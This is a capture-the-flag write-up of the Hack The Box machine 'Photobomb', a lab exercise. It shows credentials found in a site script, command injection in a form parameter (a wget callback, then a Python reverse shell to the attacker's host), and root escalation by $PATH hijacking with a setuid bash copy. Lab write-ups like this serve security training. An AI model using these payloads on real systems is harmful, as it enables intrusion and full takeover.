# Target
| Category          | Details                                                    |
|-------------------|------------------------------------------------------------|
| 📝 **Name**       | [Photobomb](https://app.hackthebox.com/machines/Photobomb) |  
| 🏷 **Type**       | HTB Machine                                                |
| 🖥 **OS**         | Linux                                                      |
| 🎯 **Difficulty** | Easy                                                       |
| 📁 **Tags**       | Command injection, $PATH hijacking                         |

# Scan
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
```

# Attack path
1. [Gain access to `/printer` backend with discovered credentials](#gain-access-to-printer-backend-with-discovered-credentials)
2. [Gain initial foothold with command injection in `filetype` form parameter](#gain-initial-foothold-with-command-injection-in-filetype-form-parameter)
3. [Escalate to `root` user with $PATH hijacking](#escalate-to-root-user-with-path-hijacking)

### Gain access to `/printer` backend with discovered credentials

#### Add `photobomb.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Photobomb]
└─$ echo "$TARGET photobomb.htb" | sudo tee -a /etc/hosts
10.129.228.60 photobomb.htb
```

#### Discover credentials in `photobomb.js`
```
┌──(magicrc㉿perun)-[~/attack/HTB Photobomb]
└─$ curl http://photobomb.htb/photobomb.js                                                                                                                                     
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

#### Use discovered credentials to access `/printer` 
```
┌──(magicrc㉿perun)-[~/attack/HTB Photobomb]
└─$ curl -I http://photobomb.htb/printer -u 'pH0t0:b0Mb!' 
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 23 Jun 2025 20:17:25 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 4915
Connection: keep-alive
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
```

### Gain initial foothold with command injection in `filetype` form parameter

#### Start `netcat` for command injection probing
```
┌──(magicrc㉿perun)-[~/attack/HTB Photobomb]
└─$ nc -lnvp 80  
listening on [any] 80 ...
```

#### Probe command injection vulnerability in `filetype` form parameter with `wget`
```
┌──(magicrc㉿perun)-[~/attack/HTB Photobomb]
└─$ LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) && \
curl http://photobomb.htb/printer -u 'pH0t0:b0Mb!' -d "photo=almas-salakhov-VK7TCqcZTlw-unsplash.jpg&filetype=jpg;wget+$LHOST&dimensions=1x1"
```

#### Confirm command injection
```
connect to [10.10.14.157] from (UNKNOWN) [10.129.228.60] 58322
GET / HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.10.14.157
Connection: Keep-Alive
```

#### Start `netcat` to listen for reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Photobomb]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

#### Inject command for Python reverse shell spawn
```
┌──(magicrc㉿perun)-[~/attack/HTB Photobomb]
└─$ LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) && \
REVERSE_SHELL=$(echo "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$LHOST\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'" | jq -sRr @uri) && \
curl http://photobomb.htb/printer -u 'pH0t0:b0Mb!' -d "photo=almas-salakhov-VK7TCqcZTlw-unsplash.jpg&filetype=jpg;$REVERSE_SHELL&dimensions=1x1"
```

#### Confirm foothold 
```
connect to [10.10.14.157] from (UNKNOWN) [10.129.228.60] 44784
$ id
id
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
```

### Escalate to `root` user with $PATH hijacking

#### List allowed sudo commands
We can run `/opt/cleanup.sh` with `SETENV` permission.
```
$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

#### Identify relative path to `chown` used in `find -exec`
```
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

#### Spawn root shell with malicious `chown` injected to $PATH
```
$ echo 'cp /bin/bash /tmp/root_shell;chmod +s /tmp/root_shell' > /tmp/chown && \
chmod +x /tmp/chown && \
sudo -E PATH=/tmp:$PATH /opt/cleanup.sh && \
/tmp/root_shell -p
root_shell-5.0# id
id
uid=1000(wizard) gid=1000(wizard) euid=0(root) egid=0(root) groups=0(root),1000(wizard)
```

